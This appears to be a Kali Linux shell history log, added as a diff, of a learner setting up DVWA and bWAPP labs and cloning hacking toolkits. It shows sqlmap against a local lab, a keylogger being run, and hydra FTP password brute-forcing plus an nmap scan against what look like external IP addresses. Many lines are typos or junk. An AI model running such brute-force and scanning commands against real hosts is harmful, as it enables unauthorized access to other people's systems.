+  710  cd /root/Desktop
+  711  bash brp.sh
+  712  bash burpsuite_community_linux_v2020_4_1.sh
+  713  ./burpsuite_community_linux_v2020_4_1.sh
+  714  firefox
+  715  java -jar burpsuite_community_v2020.4.1.jar
+  716  j
+  717  jar --h
+  718  service apache2 start
+  719  service mysql start
+  720  sqlmap -u burpsuite_community_linux_v2020_4_1.sh --dbs
+  721  sqlmap -u http://localhost/dvwa/vulnerabilities/sqli/?id=1 --dbs
+  722  sqlmap -u http://localhost/dvwa/vulnerabilities/sqli/?id=1 --dbs --level=5 --risk=3
+  723  firefox firefox firefox firefox firefox firefox firefox firefox firefox firefox firefox firefox firefox firefox firefox firefox firefox firefox firefox firefox firefox firefox firefox firefox firefox firefox firefox firefox firefox firefoxfirefox firefox firefox firefox firefox firefox firefox firefox firefox firefox firefox firefox firefox firefox firefox firefox fi
+  724  clear
+  725  forefpx forefp firefpx firefox clear
+  726  firefox google.com
+  727  firefox omwamn
+  728  firefox firefox firefox firefox firefox firefox firefox firefox firefox firefox firefox firefoxf firefox fieredox firefo firefox firefox firefox firefox firefox firefox firefox firefox firefox firefox firefox firefox firefxo firefox fie=]=
+  729  foremost
+  730  apt-get install foremost
+  731  foremost
+  732  foh
+  733  history
+  734  clear
+  735  history >> /root/Desktop/historymay2020.txt
+    1  apt-get install gparted
+    2  gparted
+    3  sudo add-apt-repository ppa:gezakovacs/ppa
+    4  apt-get install unebotin
+    5  apt-get install unetbotin
+    6  apt-get install unetbootn
+    7  apt-get install unetbootin
+    8  firefox netbootin.github.io
+    9  apt-get install gnome-screencast
+   10  apt-get install chrome
+   11  apt-get install chromium
+   12  chromium
+   13  su -l kali
+   14  ./google-chrome-stable --no-sandbox
+   15  chrome --no-sandbox
+   16  chromium --no-sandbox
+   17  xhost +
+   18  export DISPLAY='IP:0.0'
+   19  xhost +
+   20  export $DISPLAY 
+   21  service bluetooth start
+   22  chromium
+   23  chromium --no-sandbox
+   24  apt search java
+   25  apt search openjdk
+   26  apt search video
+   27  apt search wifi
+   28  apt search tool
+   29  apt search pdf
+   30  password
+   31  apt search password
+   32  apt search password crack
+   33  chromium
+   34  chromium --no-sandbox
+   35  hostname -I
+   36  apt-get install apktool
+   37  apktool
+   38  apktool -d thop.apk
+   39  apktool -h
+   40  apktool -d thop.apk -o /root/Desktop/name.apk
+   41  firefox
+   42  chrome
+   43  chromium --no-sandbox
+   44  http://192.168.43.1:1234/storage/emulated/0/som/?
+   45  vlc
+   46  service bluetooth start
+   47  vlc
+   48  service bluetooth start
+   49  fsck
+   50  errors=remount -o
+   51  errors=remount -o:
+   52  sudo -i
+   53  fdisk -l
+   54  root@kali:~# fsck
+   55  umount /
+   56  umount -f  /
+   57  fdisk -l
+   58  clear
+   59  umount /dev/mmcblk0p2
+   60  sudo -i
+   61  umount /dev/mmcblk0p2
+   62  sudo umount -l /dev/mmcblk0p2
+   63  fsck /dev/mmcblk0p2
+   64  e2fsck /dev/mmcblk0p2
+   65  sudo mount -l /dev/mmcblk0p2
+   66  sudo mount /dev/mmcblk0p2
+   67  clear
+   68  dev/mmcblk0p2
+   69  fsck dev/mmcblk0p2
+   70  fsck -p dev/mmcblk0p2
+   71  fsck -p /dev/mmcblk0p2
+   72  fsck /dev/mmcblk0p2
+   73  fsck
+   74  clear
+   75  fdisk -l
+   76  reboot
+   77  apt-get install firefox
+   78  apt-get install update
+   79  apt-get update
+   80  apt-get upgrade
+   81  apt-get autoremove
+   82  apt-get autoremove--purge
+   83  apt-get autoremove --purge
+   84  firefox
+   85  apktool -d wifi.apk
+   86  apktool d wifi.apk
+   87  apt-get install kxml
+   88  bluefish
+   89  apt-get install bluefish
+   90  sudo snap install android-studio --classic
+   91  sudo APT install android-studio --classic
+   92  sudo apt install android-studio --classic
+   93  sudo apt install android-studio
+   94  apt search android
+   95  sudo apt install anbox
+   96  ANBOX
+   97  anbox
+   98  anbox -h
+   99  apt-get install golang-github-anacrolix-dms-dev
+  100  anbox wifi.apk
+  101  sudo add-apt-repository ppa:morphis/anbox-support
+  102  sudo apt update
+  103  sudo modprobe ashmem_linux
+  104  sudo cp anbox.conf /etc/modules-load.d/
+  105  sudo cp 99-anbox.rules /lib/udev/rules.d/
+  106  sudo cp -rT ashmem /usr/src/anbox-ashmem-1
+  107  sudo cp -rT binder /usr/src/anbox-binder-1
+  108  sudo dkms install anbox-ashmem/1
+  109  sudo dkms install anbox-binder/1
+  110  sudo modprobe ashmem_linux
+  111  sudo modprobe binder_linux
+  112  lsmod | grep -e ashmem_linux -e binder_linux
+  113  ls -alh /dev/binder /dev/ashmem
+  114  sudo apt install dkms
+  115  sudo apt install linux-headers-amd64
+  116  linux-headers-amd64
+  117  anbox session-manager
+  118  sudo anbox container-manager
+  119  clear
+  120  systemctl start anbox-container-manager.service
+  121  sudo anbox container-manager
+  122  anbox session-manager
+  123  sudo snap restart anbox
+  124  systemctl enable anbox-container-manager.service 
+  125  anbox session-manager
+  126  sudo anbox container-manager
+  127  sudo systemctl start anbox-container-manager.service
+  128  sudo anbox container-manager
+  129  anbox session-manager
+  130  clear
+  131  modinfo binder_linux
+  132  modinfo ashmem_linux
+  133  anbox check-features
+  134  apt-get purge anbox
+  135  apt-get purge snap
+  136  apt-get update firefox
+  137  apt-get install firefox
+  138  apt-get install firefox-esr
+  139  apt-get install codelobster
+  140  apt-get install geany
+  141  GEANY
+  142  geany
+  143  apt-get installdex2jar
+  144  apt-get install dex2jar
+  145  apt-get install dex2jar -y
+  146  dex2jar wifi.apk
+  147  dex2jar -h
+  148  dex2jar -d wifi.apk
+  149  d2j-dex2jar -o wifi.apk
+  150  d2j-dex2jar -d wifi.apk
+  151  apt-search xml
+  152  apt search xml
+  153  apt-get install xml
+  154  apt-get install xml2
+  155  xml2
+  156  xml2 -h
+  157  apt-get purge  xml2
+  158  hostname -I
+  159  157.33.176.120
+  160  ftp 157.33.176.120
+  161  ftp 127.0.0.1
+  162  ftp 127.0.0.1:2121
+  163  ftp 127.0.0.1
+  164  ftp 127.0.0.1:2121
+  165  python install.py
+  166  apt-get purge trity
+  167  python install.py
+  168  apt-get install ftp
+  169  ftp
+  170  ftp 157.33.176.120
+  171  127.0.0.1
+  172  ftp 127.0.0.1
+  173  clear
+  174  apt update
+  175  apt install git
+  176  cd /root/Desktop
+  177  git clone https://github.com/rajkumardusad/Tool-X.git
+  178  cd Tool-X
+  179  chmod +x install.aex
+  180  sh install.aex
+  181  tool-x
+  182  Tool-X
+  183  py istall.py
+  184  py install.py
+  185  python install.py
+  186  python main.py
+  187  cd ..
+  188  git clone https://github.com/unkn0wnh4ckr/hackers-tool-kit
+  189  cd hackers-tool-kit
+  190  python install.py
+  191  chmod uhsckinsta.exe
+  192  chmod u+w hsckinsta.exe
+  193  chmod u+w hackinsta.exe
+  194  hackinsta.exe
+  195  cd..
+  196  cd ..
+  197  git clone https://github.com/king-hacking/King-Hacking.git
+  198  cd King-Hacking
+  199  bash King-Tools.sh
+  200  chromium --no-sandbox
+  201  python install.py
+  202  trity
+  203  apt-get purge python
+  204  apt-get install python
+  205  clear
+  206  cd /root/Desktop
+  207  git clone https://github.com/entynetproject/quack.git
+  208  cd quack
+  209  chmod +x install.sh
+  210  ./install.sh
+  211  quak
+  212  quack
+  213  pip requirement.txt
+  214  service bluetooth start
+  215  python r.py
+  216  cd /root/Desktop
+  217  git clone git clone https://github.com/thehackingsage/hacktronian.git
+  218  git clone https://github.com/thehackingsage/hacktronian.git
+  219  cd hacktronian
+  220  chmod +x install.sh
+  221  ./install.sh
+  222  hacktronian
+  223  cd /root
+  224  cd /root/Desktop
+  225  git clone https://github.com/SofianeHamlaoui/Lockdoor-Framework.git
+  226  git clone https://github.com/entynetproject/ghost.git
+  227  git clone
+  228  git clone https://github.com/aydinnyunus/Keylogger.git
+  229  \
+  230  git clone https://github.com/entynetproject/ehtools.git
+  231  git clone https://github.com/Viralmaniar/Remote-Desktop-Caching-.git
+  232  git clone https://github.com/AngelSecurityTeam/RapidPayload.git
+  233  python get_website.py
+  234  python get_website.py adarshcollege208.ac.in
+  235  get_website.py adarshcollege208.ac.in
+  236  history
+  237  200
+  238  chromium --no-sandbox
+  239  python keylogger.py
+  240  chmod u+x keylogger.py
+  241  python keylogger.py
+  242  chmod u+x install.sh
+  243  ./install.sh
+  244  chmod u+x install.sh
+  245  bash install.sh
+  246  ehtools
+  247  ifconfig
+  248  apt-get install snap
+  249  sudo add-apt-repository ppa:morphis/anbox-support
+  250  sudo apt install linux-headers-generic anbox-modules-dkms
+  251  sudo add-apt-repository ppa:morphis/anbox-support
+  252  sudo apt install linux-headers-generic anbox-modules-dkms
+  253  sudo modprobe ashmem_linux
+  254  clear
+  255  snap info anbox
+  256  sudo snap install --devmode --beta anbox
+  257  anbox
+  258  apt search anbox
+  259  anbox session-manager
+  260  ashmen
+  261  apt search ashmem
+  262  sudo apt-get  install linux-headers-generic anbox-modules-dkms
+  263  sudo apt-get install --devmode --beta anbox
+  264  apt-get install  ashmem_linux
+  265  sudo modprobe binder_linux
+  266  sudo apt-get modprobe binder_linux
+  267  sudo apt-get install modprobe binder_linux
+  268  git clone https://github.com/jofpin/trape.git
+  269  python2 trape.py -h
+  270  pip install -f requirement.txt
+  271  python trape.py -h
+  272  cd ?download
+  273  cd /Download
+  274  cd /root/Download
+  275  cd /root/Downloads
+  276  git clone https://github.com/boxug/trape.git
+  277  cd /trape
+  278  pip installl -r requirement.txt
+  279  apt-get install pip
+  280  - pip installl -r requirement.txt
+  281  apt-get install Flask
+  282  apt-get install flask
+  283  python trape.oy
+  284  ls
+  285  python trape.py
+  286  python trape.py -u google.com -p 80
+  287  https://github.com/Kecatoca/Trape.git
+  288  git clone https://github.com/Kecatoca/Trape.git
+  289  firefox-esr trape github
+  290  service bluetooth start
+  291  firefox
+  292  service bluetooth start
+  293  chromium --no-sandbox
+  294  apt-get install rambox
+  295  apt-get install freetuxtv
+  296  apt-get update
+  297  apt-get update --fix-missing
+  298  fsck
+  299  /dev/mcblk0p2
+  300  umount /dev/mcblk0p2
+  301  umount /dev /mmcblk0p2
+  302  umount /dev/mmcblk0p2
+  303  reboot
+  304  apt search tv
+  305  apt-get install freetuxtv
+  306  apt-get update
+  307  apt-get update --fix-missing
+  308  fsck
+  309  umount /dev/mmcblk0p2
+  310  apt-get install freetuxtv
+  311  apt-get install gimp
+  312  apt-get install tv
+  313  apt-get install tvtime
+  314  apt-get install oreotv
+  315  pt-get upgrade
+  316  apt-get upgrade
+  317  apt-get autoremove
+  318  SWHUTDOWN
+  319  shutdown
+  320  service bluetooth start'
+  321  service bluetooth start
+  322  service bluetooth start
+  323  service kdeconnect start
+  324  service bluetooth start
+  325  man bash
+  326  apt-get install burp
+  327  burp
+  328  burp[1641] Could not find ssl_cert /etc/burp/ssl_cert-client.pem: No such file or directory
+  329  burp -a -l
+  330  apt-get purge  burp
+  331  apt-get purge burp
+  332  fsck
+  333  clear
+  334  fsck
+  335  umount /root/
+  336  fsck /root
+  337  fsck /root/
+  338  e2fsck -b /root/
+  339  e2fsck -b 8193 /root/
+  340  reboot
+  341  apt-get update
+  342  apt-get upgrade -y
+  343  apt-get autoremove
+  344  service apache2 srart
+  345  service apache2 start
+  346  cd /var/www/dvwa
+  347  cd /var/www/dvwa/
+  348  cd /var/www/html
+  349  ls
+  350  chmod 777
+  351  chmod 777 dvwa
+  352  ls
+  353  chmod -R 777 dvwa
+  354  chmod -R 777 dvwa/
+  355  service mysql start
+  356  service mysql start
+  357  apt-get install mysql
+  358  burpsuit
+  359  burpsuite
+  360  apt-get update
+  361  apt-get upgrade
+  362  apt-get full-upgrade
+  363  apt-get install mysql-server
+  364  ps -ef | grep mysql | grep -v grep
+  365  clear
+  366  sudo apt-get purge mysql-server
+  367  sudo apt-get autoremove
+  368  sudo apt-get autoclean
+  369  sudo apt-get update
+  370  sudo apt-get install mysql-server
+  371  apt-get remove mysql
+  372  apt-get remove mysqlserver
+  373  apt-get remove mysql-server
+  374  apt-get purge mysql-server
+  375  apt-get install mysql-server
+  376  apt-get install mariadb
+  377  apt-get install mariadb-server
+  378  service mysql start
+  379  chmod -R 777 bwapp
+  380  chmod -R 777 dvwa
+  381  service apache2 restart
+  382  service mysql  restart
+  383  mysql
+  384  use mysql;
+  385  mysql;
+  386  mysql -u dvwa -p
+  387  chmod -R 777 dvwa
+  388  service apache2 start
+  389  service mysql start
+  390  apt-get install mysql
+  391  apt-get install myql
+  392  service mysql start
+  393  service apache2 start
+  394  service mysql start
+  395  service apache2 start
+  396  cd /var/www/html
+  397  ls
+  398  chmod -R 777 /dvwa
+  399  chmod -R 777 /dvwa/
+  400  chmod -R 777 dvwa
+  401  ls
+  402  chmod -R 777 dvwa
+  403  apt-get install php
+  404  ls
+  405  cd dvwa
+  406  ls
+  407  service apache2 restart
+  408  service mysql restart
+  409  sudo mysql -u root
+  410  service apache2 restart
+  411  service mysql restart
+  412  service apache2 start
+  413  service mysql start
+  414  apt-get -y install apache2 mysql-server php php-mysqli php-gd libapache2-mod-php
+  415  mysql
+  416  chmod -R 777 dvwa
+  417  chmod -R 777 dvwa/
+  418  service mysql start
+  419  mysql -u root -p
+  420  clear
+  421  cd /etc/php
+  422  ls
+  423  cd 7.3
+  424  ls
+  425  cd apache2
+  426  ls
+  427  nano php.ini
+  428  mysql -u root -p
+  429  service apache2 start
+  430  service mysql start
+  431  service mysql stop
+  432  service apache2 stop
+  433  service mysql start
+  434  service apache2 start
+  435  apt sarch browser
+  436  apt search browser
+  437  apt-get purge fiefox-esr
+  438  apt-get purge firefox-esr
+  439  apt-get install firefox-esr
+  440  apt-get install surf
+  441  surf
+  442  apt-get remove purge  surf
+  443  apt-get remove purge surf
+  444  apt-get --remove purge surf
+  445  service postgresql staret
+  446  service postgresql start
+  447  service mysql start
+  448  service apache2 start
+  449  sudo apt-get install php7.3-mysql
+  450  service mysql restart
+  451  service apache2 restart
+  452  chmod a+w settings.php
+  453  apt-get install php
+  454  apt-get install php7.3
+  455  apt-get install php7.3-dom
+  456  apt-get install php7.3-gd
+  457  service apache2 stop
+  458  service mysql restart
+  459  service apache2 start
+  460  apt-get install php7.3-mbstring
+  461  mkdir sites/default/files
+  462  mkdir /var/www/html/sites/default/files
+  463  chmod a+w sites/default/files
+  464  chmod a+w /var/www/html/sites/default/files
+  465  chmod a+w /var/www/html/sites/default/settings.php
+  466  mysql -u root -p
+  467  history >> /root/Desktop/hstory.txt
+  468  chmod a+w bwapp
+  469  chmod -R 777 bewapp
+  470  chmod -R 777 bwapp
+  471  burpsuite
+  472  mysql -u root -p
+  473  proxychains -h
+  474  apt-get install openconnect
+  475  omnidb-server
+  476  apt-get install omnidb-server
+  477  apt-get install plasma
+  478  apt-get install plasma-browser
+  479  apt-get install smtube
+  480  smtube
+  481  apt-get remove smtube
+  482  apt-get purgwe smtube
+  483  apt-get purge smtube
+  484  twinkle
+  485  apt-get install webext-proxy-switcher
+  486  webext-proxy-switcher
+  487  apt-get install safari
+  488  apt-get install surf
+  489  surf
+  490  apt-get purge surf
+  491  apt-get install kiosk
+  492  apt search s
+  493  apt-get install iridium
+  494  apt-get install iridium-browser
+  495  apt-get install tor-browser
+  496  sudo apt-get install -y google-chrome-stable
+  497  sudo apt-get install -y google-chrome-beta
+  498  sudo apt-get install -y google-chrome
+  499  sudo apt-get install -y opera
+  500  sudo apt-get install opera
+  501  apt search opera
+  502  sudo apt-get install vivaldi
+  503  sudo apt-get install midori
+  504  midori
+  505  sudo apt-get --remove purge midori
+  506  sudo apt-get install falkon
+  507  falkon
+  508  apt-get install sandbox
+  509  apt-get install --no-sandbox
+  510  falkon --no-sandbox
+  511  sudo apt-get --remove purge falkon
+  512  apt-get install opera
+  513  apt-get install opera-browser
+  514  apt-get install opera-stable
+  515  apt-get install vivaldi
+  516  apt-get install qupzilla
+  517  qupzilla
+  518  apt-get purge  qupzilla
+  519  apt-get install brave
+  520  apt-get install waterfox
+  521  apt-get install yandex
+  522  apt-get install yandex-browser
+  523  apt search yandex
+  524  apt search browser
+  525  apt search proxy
+  526  git clone https://github.com/GitHackTools/FTPBruter
+  527  cd FTPBruter
+  528  chmod +x ftpbruter.py
+  529  python3 ftpbruter.py
+  530  hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.103 ftp/root/Desktop/wordlist-master/
+  531  clear
+  532  cd..
+  533  hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.103 ftp
+  534  /root/Desktop/wordlist-master/hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.103 ftp
+  535  hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.103 ftp/root/Desktop/wordlist-master/
+  536  clear
+  537  hydra -L /root/Desktop/wordlist-master/usernames.txt -P /root/Desktop/wordlist-master/passlist.txt 138.38.88.113 ftp
+  538  hydra -L /root/Desktop/wordlist-master/usernames.txt -P /root/Desktop/wordlist-master/passlist.txt 198.38.88.113 ftp
+  539  nmap 198.38.88.113
+  540  0/tcp  open  pop3
+  541  git clone https://github.com/rdegges/brute.git
+  542  ls
+  543  cd brute
+  544  ls
+  545  chmod +x etup.py
+  546  chmod +x setup.py
+  547  python setup.py
+  548  setup.py --help
+  549  setup.py -help
+  550  setup.py -h
+  551  pip install brute
+  552  brute -h
+  553  brute
+  554  brute-0.0.3
+  555  chmod u+x wasp.sh
+  556  chmod u+x owasp.sh
+  557  ./owasp.sh
+  558  owaspp
+  559  owasp
+  560  zap
+  561  Java -jar zap.jar
+  562  locate zap.jar
+  563  locate zap
+  564  sh/files/bwapp/bWAPP/images/zap.png
+  565  Java -jar zapproxy
+  566  locate zapproxy
+  567  locate zaproxy
+  568  zap.sh
+  569  cd /root
+  570  cd /root/Desktop
+  571  touch om
+  572  mkdir hack
+  573  cd hack
+  574  touch omi
+  575  vim omi
+  576  cat omi
+  577  who
+  578  cat > omi2
+  579  cat omi2
+  580  vim omi2
+  581  head -1 om.txt
+  582  cd /Desktop
+  583  cd /root/Desktop
+  584  head -1 om.txt
+  585  head -10 om.txt
+  586  clear
+  587  tail -3 om.txt
+  588  > newfile
+  589  gedit enw
+  590  gedit om.txt
+  591  # useradd -m = add new user from id 5000 to 6000
+  592  groupadd name = add new roup from id 6000
+  593  #groupadd name = add new roup from id 6000
+  594  @impfiles etc/passwd /shadow/ /group /gshadow
+  595  history
+  596  clear
+  597  cut -d: f1 /etc/passwd
+  598  cut -d: f1 /etc/passwd --help
+  599  cut f1 /etc/passwd
+  600  cut -b /etc/passwd
+  601  cut -b 100 /etc/passwd
+  602  #passwd -d om = to remove passwd from the user naed om
+  603  finger
+  604  ls-l
+  605  ls -l
+  606  chmod g+w+x om.txt
+  607  chmod 765 om.jpeg
+  608  ls -l
+  609  cd /etc/network
+  610  ls
+  611  cp interfaces /root/Desktop
+  612  cp interfaces interfaces.bak
+  613  geany interfaces
+  614  man fdisk -l
+  615  fdisk -l /dev/
+  616  fdisk -l /dev/mmcblk0p2
+  617  df -h
+  618  man df -h
+  619  date
+  620  blkid /dev/root
+  621  blkid /dev/mmcblk0p1
+  622  iwconfig
+  623  iwconfig wlan1
+  624  iwconfig wlan0
+  625  date > date.txt
+  626  ls
+  627  cd ..
+  628  cd /root/Desktop
+  629  date > date.txt
+  630  wifitool
+  631  wget omwaman.xyz
+  632  wget www.omwaman.xyz
+  633  wget www.adarshcollege208.ac.in
+  634  wget www.omwaman.xyz
+  635  wget www.adarshcollege208.ac.in
+  636  cat /etc/sources-list
+  637  cat /etc/source-list
+  638  cat /etc/apt/source.listt
+  639  cat /etc/apt/source.list
+  640  cat /etc/apt/sources.list
+  641  runlevel
+  642  init 6 = switch off
+  643  vim /etc/resol.conf = nameservers
+  644  cd Desktop/
+  645  vim /etc/resol.conf
+  646  cd Desktop/
+  647  vim /etc/resolv.conf
+  648  apt-get install terminator 
+  649  figlet waman
+  650  finglet waman
+  651  apt-get install figlet
+  652  finglet waman
+  653  figlet waman
+  654  clear
+  655  figlet Hellow om waman
+  656  Hi
+  657  figlet Hellow om waman > fig.txt
+  658  figlet Hellow om waman > fig.html
+  659  figlet Hellow om waman > fig
+  660  history]
+  661  history
+  662  apt search pdf editor
+  663  apt-get install sisu
+  664  apt-get install pdftool
+  665  apt-get install pdftoipe
+  666  apt-get install okular
+  672  locate new.txt
+  673  apt-get install libreoffice
+  674  history > hs.txt
+
